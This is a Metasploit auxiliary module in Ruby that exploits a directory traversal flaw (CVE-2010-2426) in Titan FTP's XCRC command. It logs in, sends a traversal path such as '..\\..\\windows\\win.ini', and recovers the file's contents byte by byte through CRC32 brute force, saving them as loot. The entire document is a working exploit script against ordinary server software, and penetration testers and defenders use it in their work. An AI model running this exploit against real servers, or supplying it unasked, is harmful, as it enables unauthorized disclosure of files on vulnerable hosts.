##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def proto
    'ftp'
  end

  def initialize
    super(
      'Name'           => 'Titan FTP XCRC Directory Traversal Information Disclosure',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability in the XCRC command
        implemented in versions of Titan FTP up to and including 8.10.1125. By making
        sending multiple XCRC command, it is possible to disclose the contents of any
        file on the drive with a simple CRC "brute force" attack.

        Although the daemon runs with SYSTEM privileges, access is limited to files
        that reside on the same drive as the FTP server's root directory.
      },
      'Author'         =>
        [
          'jduck',
          'Brandon McCann @zeknox <bmccann[at]accuvant.com>',
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-2426' ],
          [ 'OSVDB', '65533'],
          [ 'URL', 'https://seclists.org/bugtraq/2010/Jun/160' ]
        ],
      'DisclosureDate' => 'Jun 15 2010'
    )

    register_options(
      [
        Opt::RPORT(21),
        OptString.new('TRAVERSAL', [ true, "String to traverse to the drive's root directory", "..\\..\\" ]),
        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'windows\\win.ini'])
      ])
  end


  def run_host(ip)

    c = connect_login
    return if not c

    path = datastore['TRAVERSAL'] + datastore['PATH']

    res = send_cmd( ['XCRC', path, "0", "9999999999"], true )
    if not (res =~ /501 Syntax error in parameters or arguments\. EndPos of 9999999999 is larger than file size (.*)\./)
      print_error("Unable to obtain file size! File probably doesn't exist.")
      return
    end
    file_size = $1.to_i

    update_interval = 1.5
    last_update = Time.now - update_interval

    old_crc = 0
    file_data = ''
    file_size.times { |off|
      res = send_cmd( ['XCRC', path, "0", (off+1).to_s], true )
      if not (res =~ /250 (.*)\r?\n/)
        raise RuntimeError, "Unable to obtain XCRC of byte #{off}!"
      end

      crc = $1.to_i(16)
      if (crc == 0)
        raise RuntimeError, "Unable to decode CRC: #{$1}"
      end

      ch = char_from_crc(crc, old_crc)
      if not (ch)
        raise RuntimeError, ("Unable to find a CRC match for 0x%x" % crc)
      end

      # got this byte ;)
      file_data << ch
      old_crc = crc

      if (Time.now - last_update) >= update_interval
        progress(file_size, off)
        last_update = Time.now
      end
    }

    progress(file_size, file_size)

    fname = datastore['PATH'].gsub(/[\/\\]/, '_')
    p = store_loot("titanftp.traversal", "text/plain", ip, file_data, fname)
    print_good("Saved in: #{p}")
    vprint_status(file_data.inspect)

    disconnect

  end

  #
  # Return a character code from the crc, or nil on failure
  #
  def char_from_crc(crc, old_crc)
    256.times { |x|
      ch = x.chr
      if (Zlib.crc32(ch, old_crc) == crc)
        return ch
      end
    }
    nil
  end

  def progress(total, current)
    done = (current.to_f / total.to_f) * 100
    percent = "%3.2f%%" % done.to_f
    print_status("Obtaining file contents - %7s done (%d/%d bytes)" % [percent, current, total])
  end
end
